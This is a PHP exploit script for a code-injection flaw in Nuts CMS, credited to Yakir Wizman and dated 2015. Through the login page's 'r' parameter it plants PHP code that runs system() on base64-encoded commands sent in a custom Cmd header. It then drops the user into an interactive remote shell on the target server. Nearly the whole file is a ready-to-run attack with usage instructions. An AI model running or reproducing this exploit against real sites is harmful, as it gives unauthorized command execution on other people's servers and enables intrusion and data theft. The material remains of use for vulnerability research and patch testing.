<?php
# Nuts-CMS Remote PHP Code Injection / Execution 0day Exploit
# 
# Nuts CMS is a content management system (CMS), which enables you to build Web sites and powerful online applications.
# Nuts CMS is an open source solution that is freely available to everyone.
#
# Discovered by Yakir Wizman
# Date 17/08/2015
# Vendor Homepage   : http://www.nuts-cms.com/
# CVE               : N/A
# Description       : Nuts CMS is vulnerable to php code injection due to improper input validation (CWE-20, https://cwe.mitre.org/data/definitions/20.html).
###
# Exploit code:
 
error_reporting(E_ALL);
 
$error[0] = "[!] This script is intended to be launched from the cli.";
  
if(php_sapi_name() <> "cli")
    die($error[0]);
      
if($argc < 3) {
    echo("\nUsage  : php {$argv[0]} <host> <path>");
    echo("\nExample: php {$argv[0]} localhost /");
    die();
}
 
if(isset($argv[1]) && isset($argv[2])) {
    $host = $argv[1];
    $path = $argv[2];
}
 
$pack = "GET {$path}nuts/login.php?r=<?php+error_reporting(0);print(_nutCmsId_);system(base64_decode(\$_SERVER[HTTP_CMD]));die;+?> HTTP/1.0\r\n";
$pack.= "Host: {$host}\r\n";
$pack.= "Cmd: %s\r\n";
$pack.= "Connection: close\r\n\r\n";
 
while(1) {
    print "\nAnonymous@{$host}:~# ";
    if(($cmd = trim(fgets(STDIN))) == "exit")
        break;
    preg_match("/_nutCmsId_(.*)/s", http_send($host, sprintf($pack, base64_encode($cmd))), $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
}
 
function http_send($host, $pack) {
    if(!($sock = fsockopen($host, 80)))
        die("\n[-] No response from {$host}\n");
    fwrite($sock, $pack);
    return stream_get_contents($sock);
}
?>